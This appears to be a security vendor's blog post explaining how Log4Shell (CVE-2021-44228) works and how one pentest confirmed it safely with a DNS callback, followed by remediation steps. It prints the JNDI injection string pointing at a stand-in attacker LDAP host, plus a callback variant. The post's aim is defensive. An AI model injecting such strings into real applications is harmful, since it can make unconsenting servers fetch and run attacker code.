---
layout: post
title: "One String, Full RCE: How Log4Shell Actually Works"
author: snapsec
categories: [VAPT]
image: assets/images/23/LOG4j-image.png
---

## Introduction

Log4Shell (CVE-2021-44228) let a single logged string turn Log4j2 into remote code execution — no auth, no complex chain, just text landing in a log line.

This walks through how it works, and how to prove it in a real application without firing the exploit.

> Target details are removed and screenshots are sanitized. This documents the technique, not the target.

## How It Works

Old Log4j2 versions evaluate `${...}` expressions in logged strings, including JNDI lookups. If attacker input reaches a vulnerable log call:

```text
${jndi:ldap://attacker-server/a}
```

Log4j2 performs a JNDI lookup to the attacker's LDAP server, which returns a remote Java class the app loads and runs — RCE. The injection point is any attacker-controlled input that ends up in a vulnerable log line: a form field, a header, a username.

## Detecting It Safely

Firing real RCE in someone's environment is reckless. The safe proof is an out-of-band callback: instead of loading a class, just confirm the target reaches infrastructure you control.

Generate a unique subdomain from a DNS logging service and put it in the payload:

```text
${jndi:ldap://<controlled-subdomain>/a}
```

If a vulnerable Log4j2 call processes it, the JNDI lookup resolves that subdomain and the request lands in your dashboard. Nothing is executed, nothing is touched.

### Image 1

![Image 1](/assets/images/log4j1.png)

Controlled subdomain from a DNS monitoring service.

## Reproduction

The payload went in through a feature that wrote user input to a server-side log.

### Image 2

![Image 2](/assets/images/log4j2.png)

Payload submitted through the application.

## Confirmation

The dashboard showed inbound requests for the controlled subdomain — the app resolved it while processing the payload.

### Image 3

![Image 3](/assets/images/log4j3.png)

DNS requests for the controlled subdomain.

A callback proves the vulnerable lookup path is live. It does not, by itself, prove code execution. So this is reported as confirmed vulnerable JNDI processing — the same path can be taken to full RCE via an LDAP referral in a permitted exploitation phase.

## Severity

- **Category:** Web App
- **Vulnerability:** Server-Side Injection > Remote Code Execution (RCE)
- **Component:** Log4j2 (CVE-2021-44228)
- **Environment:** Staging Web Application
- **Priority:** P1

> P1 reflects the original assessment. The evidence here confirms vulnerable JNDI processing and an outbound DNS callback, not arbitrary code execution.

Staging isn't a safe place for this. It often shares code, dependencies, and network paths with production — a vulnerable dependency here is a foothold.

## Remediation and Defense

- Upgrade Log4j2 to the latest supported release, and check the full dependency tree — Log4j2 is usually pulled in indirectly.
- Where you can't upgrade yet, follow Apache or vendor mitigation guidance to remove the vulnerable components.
- Restrict outbound network access from app servers so a stray lookup can't reach external LDAP or DNS.
- Detect `${jndi:` and its obfuscations as defense-in-depth, not as a fix.

## Takeaway

Log4Shell needs nothing more than getting a string into a logged field. That's what makes it worth understanding: the injection surface is every input that eventually gets logged, and the safest proof is the one that never executes anything.

## Secure What Matters

Find vulnerabilities before attackers do.

[Get a demo with Snapsec](https://suite.snapsec.co/demo)
